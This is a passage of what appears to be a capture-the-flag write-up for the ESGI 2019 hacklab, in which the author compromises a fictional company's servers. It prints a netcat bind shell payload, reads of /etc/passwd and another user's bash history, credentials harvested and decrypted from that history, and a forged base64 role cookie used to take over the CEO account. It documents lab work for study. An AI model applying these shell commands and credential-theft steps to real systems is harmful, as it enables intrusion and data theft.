+
+<p>Let&rsquo;s obtain a bind shell (reverse shell are particulary complicated when there is several proxys)</p>
+
+<p>Payload : <code>nc -vlp 5555 -e /bin/bash</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/28.png" alt="" /></p>
+
+<p>Connect to it : <code>proxychains -q nc 10.0.0.2 5555</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/27.png" alt="" /></p>
+
+<h2 id="step-8-bash-history-permission-mistake">Step 8 : Bash history permission mistake</h2>
+
+<p>Let&rsquo;s check some classic files</p>
+
+<pre><code class="language-bash">tomcat@project-server:/home$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:109::/var/run/dbus:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+tomcat:x:1001:1001::/opt/tomcat:/bin/false
+fdaigle:x:1000:1000:Frederic Daigle,6,03.32.53.60.97,03.32.53.60.97,CEO:/home/fdaigle:/bin/bash
+dcloutier:x:1002:1002:Daniel Cloutier,3,01.13.79.95.54,01.13.79.95.54,Sysadmin and project manager:/home/dcloutier:/bin/bash
+csouplet:x:1003:1003:Charlotte Souplet,2,03.02.69.97.28,03.02.69.97.28,Frontend developer:/home/csouplet:/bin/bash
+trobin:x:1004:1004:Thibaud Robin,8,01.45.67.43.56,01.45.67.43.56,Trainee full stack developer:/home/trobin:/bin/bash
+
+
+tomcat@project-server:/home$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	project-server
+
+10.0.0.1	dev-server 		dev-server.zedcorp
+10.0.0.2	project-server	project-server.zedcorp
+10.0.0.3	admin-server	admin-server.zedcorp
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+tomcat@project-server:/home$ cat /etc/resolv.conf
+cat /etc/resolv.conf
+search zedcorp
+nameserver 10.0.0.1
+</code></pre>
+
+<p>We have new users of ZedCorp company. Let&rsquo;s check their home.</p>
+
+<p>Let&rsquo;s check user home like the kanbans task said.</p>
+
+<pre><code>tomcat@project-server:/$ cd /home
+cd /home
+
+tomcat@project-server:/home$ ls -al
+ls -al
+total 24
+drwxr-xr-x  6 root      root      4096 mars  18 15:37 .
+drwxr-xr-x 22 root      root      4096 mars  21 15:52 ..
+drwxr-xr-x  2 csouplet  csouplet  4096 mars  20 10:46 csouplet
+drwxr-xr-x  2 dcloutier dcloutier 4096 mars  20 10:42 dcloutier
+drwxr-xr-x  2 fdaigle   fdaigle   4096 mars  18 15:00 fdaigle
+drwxr-xr-x  2 trobin    trobin    4096 mars  20 10:52 trobin
+
+tomcat@project-server:/home$ ls -al *
+ls -al *
+csouplet:
+total 24
+drwxr-xr-x 2 csouplet csouplet 4096 mars  20 10:46 .
+drwxr-xr-x 6 root     root     4096 mars  18 15:37 ..
+-rw------- 1 csouplet csouplet   30 mars  20 10:46 .bash_history
+-rw-r--r-- 1 csouplet csouplet  220 mars  18 15:05 .bash_logout
+-rw-r--r-- 1 csouplet csouplet 3526 mars  18 15:05 .bashrc
+-rw-r--r-- 1 csouplet csouplet  675 mars  18 15:05 .profile
+
+dcloutier:
+total 32
+drwxr-xr-x 2 dcloutier dcloutier 4096 mars  20 10:42 .
+drwxr-xr-x 6 root      root      4096 mars  18 15:37 ..
+-rw-r--r-- 1 dcloutier dcloutier 1231 mars  20 10:42 .bash_history
+-rw-r--r-- 1 dcloutier dcloutier  220 mars  18 15:01 .bash_logout
+-rw-r--r-- 1 dcloutier dcloutier 3543 mars  20 10:35 .bashrc
+-rw-r--r-- 1 dcloutier dcloutier  675 mars  18 15:01 .profile
+-rw-r--r-- 1 dcloutier dcloutier   80 mars  18 23:34 TODO.txt
+-rw-r--r-- 1 dcloutier dcloutier 1886 mars  20 10:35 .viminfo
+
+fdaigle:
+total 20
+drwxr-xr-x 2 fdaigle fdaigle 4096 mars  18 15:00 .
+drwxr-xr-x 6 root    root    4096 mars  18 15:37 ..
+-rw-r--r-- 1 fdaigle fdaigle  220 mars  18 15:00 .bash_logout
+-rw-r--r-- 1 fdaigle fdaigle 3526 mars  18 15:00 .bashrc
+-rw-r--r-- 1 fdaigle fdaigle  675 mars  18 15:00 .profile
+
+trobin:
+total 744
+drwxr-xr-x 2 trobin trobin   4096 mars  20 10:52 .
+drwxr-xr-x 6 root   root     4096 mars  18 15:37 ..
+-rw-r--r-- 1 trobin trobin   4939 mars  14 23:47 angular.html
+-rw-r--r-- 1 trobin trobin     34 mars  20 10:52 backend.sh
+-rw------- 1 trobin trobin    376 mars  20 10:52 .bash_history
+-rw-r--r-- 1 trobin trobin    220 mars  18 15:06 .bash_logout
+-rw-r--r-- 1 trobin trobin   3543 mars  20 10:50 .bashrc
+-rw-r--r-- 1 trobin trobin 713622 févr. 13 17:03 bootstrap-4.3.1-dist.zip
+-rw-r--r-- 1 trobin trobin    675 mars  18 15:06 .profile
+-rw------- 1 trobin trobin    911 mars  20 10:52 .viminfo
+-rw-r--r-- 1 trobin trobin    200 mars  20 10:51 .wget-hsts
+</code></pre>
+
+<p>OH ! Bash history of our lovely sysadmin is readable.</p>
+
+<pre><code>tomcat@project-server:/home$ cat /home/dcloutier/.bash_history
+cat /home/dcloutier/.bash_history
+ls
+ls -al
+echo &gt; test.txt
+ls -al
+rm test.txt 
+ls -al
+exit
+ls -al
+ping admin-server
+cat /etc/hosts
+ping project-server 
+ping dev-server
+ls -al
+curl http://admin-server
+chmod 644 .*
+curl -v http://admin-server
+zip
+cat /etc/passwd
+tar
+tar --help
+l /opt/tomcat/logs/
+ls -al /opt/tomcat/logs/
+cat /opt/tomcat/logs/localhost.2019-03-18.log 
+sudo -s
+sudo -l
+ls -al /var/log/auth.log 
+cat /var/log/auth.log 
+cat /var/log/syslog 
+ls -al /var/log
+ls -al
+vi creds.txt
+openssl
+cat /etc/passwd
+vi credentials.txt
+cat credentials.txt 
+cat -&gt; TODO.txt
+tar -czf - credentials.txt | openssl enc -e -aes256 -out credentials.tar.gz
+tar -czf - credentials.txt | openssl enc -e -aes256 -out credentials.tar.gz --pass pass:daniel2019
+ls -al
+cat credentials.txt 
+lftp -u 'backup,46t5r2e5t&amp;2z!' admin-server
+lftp -c 'open -u backup,46t5r2e5t&amp;2z! admin-server; put -O / credentials.tar.gz' 
+lftp -c 'open -u backup,46t5r2e5t&amp;2z! admin-server; put -O / ~/credentials.tar.gz' 
+ftp admin-server
+cat TODO.txt 
+l
+ls -al
+exit
+l
+ls
+rm credentials.tar.gz
+rm credentials.txt 
+vi .bashrc 
+source .bashrc 
+l
+l .config/
+l .config/lftp/
+l
+l .local/share/lftp/
+cat  .local/share/lftp/cwd_history 
+cat  .local/share/lftp/rl_history 
+l
+rm -rf .config/
+rm -rf .local/
+exit
+</code></pre>
+
+<p>Haha ! That what I thank ! Credentials in bash history typed in the terminal by the user. And we can see his error with his command <code>chmod 644 .*</code>. Too bad :D</p>
+
+<p>So we have now :</p>
+
+<ul>
+<li>Credentials for ftp admin-server : <code>backup,46t5r2e5t&amp;2z!</code></li>
+<li>Documents encrpted with openssl and password : <code>daniel2019</code></li>
+</ul>
+
+<p>Next step : admin-server pwn</p>
+
+<p>Don&rsquo;t forget to remove your backdoor (and nothing else bad h4x0r) :p</p>
+
+<pre><code>tomcat@project-server:/home$ cd /opt/tomcat/webapps/ROOT/
+tomcat@project-server:~/webapps/ROOT$ rm exploit.jsp
+rm exploit.jsp
+tomcat@project-server:~/webapps/ROOT$ ls -al
+ls -al
+total 48
+drwxr-xr-x 2 tomcat tomcat  4096 mars  24 02:21 .
+drwxr-xr-x 7 root   root    4096 mars  20 11:03 ..
+-rwxr--r-- 1 root   root       1 mars  20 11:06 favicon.ico
+-rw-r--r-- 1 root   root    4849 mars  21 15:49 index.html
+-rw-r--r-- 1 root   root    6284 mars  18 17:16 kanban.css
+-rw-r--r-- 1 root   root   18191 mars  18 17:16 kanban.js
+</code></pre>
+
+<h2 id="step-9-access-to-admin-server-s-ftp-service">Step 9 : Access to admin-server&rsquo;s FTP service</h2>
+
+<p><img src="/img/hacklab-esgi-2019/29.png" alt="" /></p>
+
+<p>You can download the file <code>credentials.tar.gz</code> with the command <code>get credentials.tar.gz</code></p>
+
+<p>Decrypt it</p>
+
+<pre><code>[th1b4ud@th1b4ud-pc]$ openssl enc -d -aes256 --pass pass:daniel2019 -in credentials.tar.gz | tar xz
+
+[th1b4ud@th1b4ud-pc]$ cat credentials.txt
+
+CREDENTIALS
+===========
+- Basic auth on http://admin-server:80
+    + Username : admin
+    + Password : zedc0rp2019!
+
+- Simple test account on http://admin-server:80
+    + Username : user
+    + Password : user-zedcorp-2019
+
+- Privileged test account on http://admin-server:80
+    + Username : admin
+    + Password : admin-zedcorp-2019
+
+- CEO Privileged test account on http://admin-server:80
+    + Username : ceo
+</code></pre>
+
+<p>So sweet ! It&rsquo;s the backup of the administrator&rsquo;s passwords. We can now access to admin platform on admin-server.</p>
+
+<h2 id="step-10-access-to-admin-server-s-admin-platform">Step 10 : Access to admin-server&rsquo;s admin platform</h2>
+
+<p>With credentials <code>admin:zedc0rp2019!</code> we can access to the website.</p>
+
+<p><img src="/img/hacklab-esgi-2019/30.png" alt="" /></p>
+
+<p>Let&rsquo;s try to login with simple test account : <code>user:user-zedcorp-2019</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/31.png" alt="" /></p>
+
+<p>With privileged test account : <code>admin:admin-zedcorp-2019</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/32.png" alt="" /></p>
+
+<p>And with ceo account with unknow password</p>
+
+<p><img src="/img/hacklab-esgi-2019/33.png" alt="" /></p>
+
+<p>Interesting. Let&rsquo;s check document upload functionnality.</p>
+
+<p><img src="/img/hacklab-esgi-2019/34.png" alt="" /></p>
+
+<p>Bruh ! Not working :(</p>
+
+<h2 id="step-11-access-to-ceo-s-session">Step 11 : Access to CEO&rsquo;s session</h2>
+
+<p>Let&rsquo;s check requests captured by burp.</p>
+
+<p><img src="/img/hacklab-esgi-2019/35.png" alt="" /></p>
+
+<p>There is some cookies. Look at this strange cookie <code>status</code>. He has the value <code>admin</code> encoded in base64. Do you think the application check user status with this status ? Let&rsquo;s check with <code>ceo</code>.</p>
+
+<pre><code class="language-bash">[th1b4ud@th1b4ud-pc]$ echo &quot;YWRtaW4=&quot; | base64 -d
+admin
+[th1b4ud@th1b4ud-pc]$ echo -n &quot;ceo&quot; | base64
+Y2Vv
+</code></pre>
+
+<p><img src="/img/hacklab-esgi-2019/36.png" alt="" /></p>
+
+<p>Welcome Frederic ! We win ! We are the CEO !</p>
+
+<p><img src="/img/hacklab-esgi-2019/38.png" alt="" /></p>
+
+<h2 id="step-12-download-confidential-projects">Step 12 : Download confidential projects</h2>
+
+<p>They are there ! Our targets !</p>
+
+<p><img src="/img/hacklab-esgi-2019/37.png" alt="" /></p>
+
+<p>Open it and get your reward ! Good job young h4x0r :)</p>
+
+<p>[The actual flag was changed for the scenario ]</p>
+
+<p><code>ESGI{Y0u-W1ll-n3v3r_B34T_M3:DUk3-B3}</code></p>
+
+	
+			
+
+			
+
+			
+          </section>
+          
+          	
+          
+        
+      <div class="footer">
+	<hr class="thin" />
+	<div class="pure-menu pure-menu-horizontal pure-menu-open">
+		<ul class="footer-menu">
+		
+		</ul>
+	</div>
+
+	<p>&copy; 2019. All rights reserved.</p>
+</div>
+    </div>
+  </div>
+	
+
+	
+
+  
+</body>
+</html>
